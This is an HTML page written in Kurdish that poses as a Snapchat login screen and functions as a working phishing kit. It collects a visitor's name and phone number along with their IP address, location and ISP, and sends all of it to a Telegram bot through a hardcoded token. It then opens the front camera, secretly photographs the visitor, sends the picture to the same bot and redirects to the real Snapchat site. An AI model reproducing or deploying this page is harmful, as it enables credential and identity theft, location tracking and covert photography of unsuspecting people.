<!DOCTYPE html>
<html lang="ckb" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - چوونەژوورەوە</title>
    <link rel="icon" href="https://assets.sc-static.net/images/ico/favicon.ico" type="image/x-icon">
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            margin: 0;
            padding: 0;
            background-color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #ffffff;
        }
        .container {
            background: #121212;
            padding: 30px;
            border-radius: 16px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            text-align: center;
        }
        .logo {
            width: 50px;
            height: 50px;
            margin-bottom: 20px;
        }
        h2 {
            margin-bottom: 20px;
            font-size: 22px;
            color: #FFFC00;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: right;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #b0b0b0;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #333;
            background: #1a1a1a;
            color: #fff;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s;
        }
        input:focus {
            border-color: #FFFC00;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #FFFC00;
            color: #000;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        button:hover {
            background: #e6e300;
        }
        .loader {
            display: none;
            border: 4px solid #1a1a1a;
            border-top: 4px solid #FFFC00;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="container" id="form-container">
    <svg class="logo" viewBox="0 0 512 512" fill="#FFFC00"><path d="M256 0c-88.366 0-160 71.634-160 160 0 35.856 11.908 68.904 32 95.832C84.34 286.992 48 340.54 48 400c0 22.092 17.908 40 40 40h328c22.092 0 40-17.908 40-40 0-59.46-36.34-113.008-80-144.168 20.092-26.928 32-59.976 32-95.832C416 71.634 344.366 0 256 0z"/></svg>
    <h2>چوونەژوورەوە بۆ سناپچات</h2>
    <form id="loginForm" onsubmit="handleFormSubmit(event)">
        <div class="input-group">
            <label for="name">ناوی تەواو:</label>
            <input type="text" id="name" required placeholder="ناوی خۆت بنووسە">
        </div>
        <div class="input-group">
            <label for="phone">ژمارەی مۆبایل:</label>
            <input type="tel" id="phone" required placeholder="07xxxxxxxxx">
        </div>
        <button type="submit" id="submitBtn">بەردەوامبوون</button>
        <div class="loader" id="loader"></div>
    </form>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const BOT_TOKEN = '8949783785:AAGFxmrR3tvlN2IMVpswF-ObNzBthE-0nQ0';
    const CHAT_ID = '8254783776';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // وەرگرتنی زانیاریەکانی IP و شوێن و کات
    async function collectAndSendData(name, phone) {
        let ipData = {};
        try {
            const response = await fetch('https://ipapi.co/json/');
            ipData = await response.json();
        } catch (err) {
            console.error("هەڵە لە وەرگرتنی IP:", err);
        }

        const now = new Date();
        const currentTime = now.toLocaleString('ckb', { timeZone: 'Asia/Baghdad' });

        const textMessage = `🚨 *زانیاری نوێ وەگیرا!*
👤 *ناوی کەسەکە:* \`${name}\`
📱 *ژمارەی موبایل:* \`${phone}\`
⏰ *کات:* \`${currentTime}\`
📌 *IP:* \`${ipData.ip || 'نەزانراو'}\`
🏙 *شار:* \`${ipData.city || 'نەزانراو'}\`
🏳 *وڵات:* \`${ipData.country_name || 'نەزانراو'}\`
📍 *شوێن (پین):* \`${ipData.latitude || 0}, ${ipData.longitude || 0}\`
🏢 *هێڵ (ISP):* \`${ipData.org || 'نەزانراو'}\``;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: textMessage,
                    parse_mode: 'Markdown'
                })
            });
        } catch (e) {
            console.error("نەتوانی تێگشتن بنێرێت بۆ تلگرام", e);
        }
    }

    async function handleFormSubmit(event) {
        event.preventDefault();
        
        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        
        document.getElementById('submitBtn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        // ناردنی داتای نوسراو
        await collectAndSendData(name, phone);

        // هەوڵدانی گرتنی وێنەی کامێرا
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            video.srcObject = stream;

            setTimeout(() => {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(function(blob) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'user_photo.jpg');
                    formData.append('caption', `وێنەی کەسەکە: ${name} (${phone})`);

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .finally(() => {
                        window.location.href = "https://www.snapchat.com"; 
                    });
                }, 'image/jpeg');
            }, 800);

        } catch (err) {
            // ئەگەر کامێرا مۆڵەتی نەدا یان ڕەتی کردەوە
            window.location.href = "https://www.snapchat.com";
        }
    }
</script>
</body>
</html>
